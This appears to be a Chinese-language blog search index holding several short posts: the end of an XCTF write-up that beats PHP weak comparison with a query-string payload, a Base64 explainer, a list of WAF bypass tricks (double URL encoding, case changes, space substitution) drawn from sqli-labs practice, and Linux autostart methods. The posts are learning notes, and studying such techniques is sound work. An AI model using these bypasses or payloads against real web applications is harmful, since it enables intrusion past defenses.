title="传入json格式的c值，并将其转化为PHP数组变量"></a>传入json格式的c值，并将其转化为PHP数组变量</h5><pre class="line-numbers language-json" data-language="json"><code class="language-json">json格式的字符串<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"a"</span><span class="token operator">:</span><span class="token string">"php"</span><span class="token punctuation">,</span><span class="token property">"b"</span><span class="token operator">:</span><span class="token string">"mysql"</span><span class="token punctuation">,</span><span class="token property">"c"</span><span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token comment">//其中可以理解a为键，php为值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><h5 id="要求数组c中m的值不可以是纯数字，且需要大于2022"><a href="#要求数组c中m的值不可以是纯数字，且需要大于2022" class="headerlink" title="要求数组c中m的值不可以是纯数字，且需要大于2022"></a>要求数组c中m的值不可以是纯数字，且需要大于2022</h5><p>​看到使用弱比较</p><blockquote><p>使得:{“m”:”1e4c”}</p></blockquote></li><li><h5 id="要求数组的n具有两个元素，并且第一个元素还是数组"><a href="#要求数组的n具有两个元素，并且第一个元素还是数组" class="headerlink" title="要求数组的n具有两个元素，并且第一个元素还是数组"></a>要求数组的n具有两个元素，并且第一个元素还是数组</h5><blockquote><p>使得:  {“n”:[[1],1]}</p></blockquote></li><li><h5 id="通过6和7判断出，6知道数组n中需要有”DGGJ“的值，7知道数组n中不可以有“DGGJ”的值"><a href="#通过6和7判断出，6知道数组n中需要有”DGGJ“的值，7知道数组n中不可以有“DGGJ”的值" class="headerlink" title="通过6和7判断出，6知道数组n中需要有”DGGJ“的值，7知道数组n中不可以有“DGGJ”的值"></a>通过6和7判断出，6知道数组n中需要有”DGGJ“的值，7知道数组n中不可以有“DGGJ”的值</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">array_search</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数结果：如果找不到<span class="token constant">DGGJ</span>就返回<span class="token constant boolean">FALSE</span>，找到返回key分析：该函数使用的是弱比较，知道字符串开头的字符串<span class="token operator">==</span><span class="token number">0</span>，所以<span class="token string double-quoted-string">"DGGJ"</span><span class="token operator">==</span><span class="token number">0</span> 成立<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>所以更正n：{“n”:[[1],0]}</p></blockquote><p>综上所述:</p></li></ol><p>​payload：?a&#x3D;1e9&amp;b&#x3D;53724&amp;c&#x3D;{“m”:”1e4c”,”n”:[[1],0]}</p>]]></content>
      
      
      <categories>
          
          <category> 题目集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>了解Base64编码</title>
      <link href="/2023/05/28/base64%E7%BC%96%E7%A0%81/"/>
      <url>/2023/05/28/base64%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h1><p>原来内容用UTF-8编码转化为底层二进制，根据编码规则和编码索引表转化成为base64内容。</p><h2 id="编码内容"><a href="#编码内容" class="headerlink" title="编码内容"></a>编码内容</h2><p>Base64编码可以打印64个不同字符，分别为字母 A-Z、a-z、数字 0-9，还有’+’和’&#x2F;‘。(特殊的情况还有一个’&#x3D;’)</p><h2 id="编码索引"><a href="#编码索引" class="headerlink" title="编码索引:"></a>编码索引:</h2><table><thead><tr><th>码值</th><th>字符</th><th>码值</th><th>字符</th><th>码值</th><th>字符</th><th>码值</th><th>字符</th></tr></thead><tbody><tr><td>0</td><td>A</td><td>16</td><td>Q</td><td>32</td><td>g</td><td>48</td><td>w</td></tr><tr><td>1</td><td>B</td><td>17</td><td>R</td><td>33</td><td>h</td><td>49</td><td>x</td></tr><tr><td>2</td><td>C</td><td>18</td><td>S</td><td>34</td><td>i</td><td>50</td><td>y</td></tr><tr><td>3</td><td>D</td><td>19</td><td>T</td><td>35</td><td>j</td><td>51</td><td>z</td></tr><tr><td>4</td><td>E</td><td>20</td><td>U</td><td>36</td><td>k</td><td>52</td><td>0</td></tr><tr><td>5</td><td>F</td><td>21</td><td>V</td><td>37</td><td>l</td><td>53</td><td>1</td></tr><tr><td>6</td><td>G</td><td>22</td><td>W</td><td>38</td><td>m</td><td>54</td><td>2</td></tr><tr><td>7</td><td>H</td><td>23</td><td>X</td><td>39</td><td>n</td><td>55</td><td>3</td></tr><tr><td>8</td><td>I</td><td>24</td><td>Y</td><td>40</td><td>o</td><td>56</td><td>4</td></tr><tr><td>9</td><td>J</td><td>25</td><td>Z</td><td>41</td><td>p</td><td>57</td><td>5</td></tr><tr><td>10</td><td>K</td><td>26</td><td>a</td><td>42</td><td>q</td><td>58</td><td>6</td></tr><tr><td>11</td><td>L</td><td>27</td><td>b</td><td>43</td><td>r</td><td>59</td><td>7</td></tr><tr><td>12</td><td>M</td><td>28</td><td>c</td><td>44</td><td>s</td><td>60</td><td>8</td></tr><tr><td>13</td><td>N</td><td>29</td><td>d</td><td>45</td><td>t</td><td>61</td><td>9</td></tr><tr><td>14</td><td>O</td><td>30</td><td>e</td><td>46</td><td>u</td><td>62</td><td>+</td></tr><tr><td>15</td><td>P</td><td>31</td><td>f</td><td>47</td><td>v</td><td>63</td><td>&#x2F;</td></tr></tbody></table><h2 id="编码规则"><a href="#编码规则" class="headerlink" title="编码规则"></a>编码规则</h2><p>1.把每<strong>三个 8Bit 字节</strong>转换为<strong>四个 6Bit 字节</strong></p><blockquote><p>例子:abc<br>二进制转化(3个8bit):<br>01100001&amp;ensp;&amp;ensp; 01100010&amp;ensp;&amp;ensp;01100011<br><br>二进制转化(4个6bit)<br>011000&amp;ensp;&amp;ensp;010110&amp;ensp;&amp;ensp; 000101&amp;ensp;&amp;ensp; 100011<br><br>abc根据base64编码索引表转化为:YWJj</p></blockquote><p>2.<strong>不够3个字符的需要补00(单字符高位补00，两字符低位补00)<strong>，存在</strong>空位</strong>用’<strong>&#x3D;</strong>‘来补充</p><blockquote><p>例子1:a<br>二进制转化(只有1个8bit):<br>01100001<br>二进制转化为(只有2个6bit):<br><strong>00</strong>0110 &amp;ensp;&amp;ensp;<strong>00</strong>0001&amp;ensp;&amp;ensp; 空&amp;ensp;&amp;ensp; 空<br>a根据base64编码索引表转化为:YQ&#x3D;&#x3D;<br><br>例子2:ab<br>二进制转化(只有2个8bit):<br>01100001&amp;ensp;&amp;ensp; 01100010<br>二进制转化为(只有3个6bit):<br>011000&amp;ensp;&amp;ensp;010110&amp;ensp;&amp;ensp;0010<strong>00</strong>&amp;ensp;&amp;ensp;空<br>ab根据base64编码索引表转化为:YWI&#x3D;</p></blockquote><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>1.证书<br>2.XML镶嵌进另一个XML文件<br>3.网页的小图片镶入<br>4.较老的纯文本协议 SMTP</p>]]></content>
      
      
      <categories>
          
          <category> 基础认识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WAF以及其绕过方式</title>
      <link href="/2023/05/28/WAF%E4%BB%A5%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/"/>
      <url>/2023/05/28/WAF%E4%BB%A5%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>yiWeb应用防火墙通过一系列检测规则来实现对请求内容的防护处理，保护Web的应用安全和合法性</p><h3 id="1-WAF含义"><a href="#1-WAF含义" class="headerlink" title="1.WAF含义:"></a>1.WAF含义:</h3><p>​Web应用防火墙通过一系列检测规则来实现对请求内容的防护处理，保护Web的应用安全和合法性</p><h3 id="2-处理流程"><a href="#2-处理流程" class="headerlink" title="2.处理流程:"></a>2.处理流程:</h3><p>​WAF的处理流程大致可分为四部分：预处理、规则检测、处理模块、日志记录(归纳网上查找的资料)</p><blockquote><p> 1.预处理:判断收到数据是否为HTTP&#x2F;HTTPS请求，是否是在白名单<br>   2.检测规则：每一种WAF都有自己不同的检测规则，如果请求不符合规则，标识这些数据内容为恶意数据<br>   3.处理模块：符合规则则交由服务器响应处理，不符合则进行相关的阻断、记录、警告处理<br>   4.日志记录：WAF会记录拦截处理日志记录</p></blockquote><h3 id="3-绕过方式"><a href="#3-绕过方式" class="headerlink" title="3.绕过方式:"></a>3.绕过方式:</h3><p>​绕过WAF的方式：(结合使用过的sqli-labs)<br>​    1.编码绕过(使用各种编码转化进行规则绕过，如：url中单引号’转化为%2527进行绕过规则过滤）<br>​    2.字母大小写转换绕过<br>​    3.空格过滤绕过(可以使用+来实现绕过）<br>​    4.双关键字绕过(*)</p>]]></content>
      
      
      <categories>
          
          <category> 问题集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux开机自启动方式</title>
      <link href="/2023/05/28/Linux%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F/"/>
      <url>/2023/05/28/Linux%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux开机自启动方式"><a href="#Linux开机自启动方式" class="headerlink" title="Linux开机自启动方式"></a>Linux开机自启动方式</h1><h2 id="1-使用systemd服务"><a href="#1-使用systemd服务" class="headerlink" title="1.使用systemd服务"></a>1.使用systemd服务</h2><p>​ （1）在&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;目录下创建’命名.service’<br>​ （2）命名.service的内容：<br>​[Unit]<br>​Description&#x3D;描述名</p><pre><code>    [Service]    ExecStart=配置文件路径    [Install]    WantedBy=依赖目标(在依赖目标启动时候启动）</code></pre><h2 id="2-使用cron作业"><a href="#2-使用cron作业" class="headerlink" title="2.使用cron作业"></a>2.使用cron作业</h2><p>​ （1）使用shell命令：crontab -e<br>​ （2）选择编辑器进入编辑后:@reboot 需要启动的路径&#x2F;&#x2F;@reboot是特殊的时间参数，表示系统启动执行</p><h2 id="3-用户级别启动"><a href="#3-用户级别启动" class="headerlink" title="3.用户级别启动"></a>3.用户级别启动</h2><p>​ （1）在用户的主目录下编辑’~&#x2F;.bashrc’<br>​ （2）在文件末尾添加需要启动的路径后保存退出<br>​ （3）重启终端更新配置</p><h2 id="4-使用init-d-脚本"><a href="#4-使用init-d-脚本" class="headerlink" title="4.使用init.d 脚本"></a>4.使用init.d 脚本</h2>]]></content>
      
      
      <categories>
          
          <category> 问题集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
